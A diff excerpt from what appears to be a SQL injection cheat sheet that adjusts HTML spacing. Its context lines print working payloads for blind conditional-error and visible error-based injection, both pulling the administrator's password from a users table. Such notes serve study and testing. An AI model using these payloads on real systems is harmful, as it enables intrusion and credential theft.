@@ -310,8 +310,6 @@ dissapears, meaning the final value is the total lenght.
 
 <b>SAMPLE: </b><mark>'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
 
-<br>
-<br>
 <details>
 <summary>VISIBLE ERROR-BASED</summary>
 <p><b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking for errors. 
@@ -345,7 +343,6 @@ valid syntax format.
 
 <b>SAMPLE: </b><mark>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</mark>
 </p>
-<br>
 <details>
 <summary>TIME DELAY TECHNIQUES</summary>
 <p><b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However,
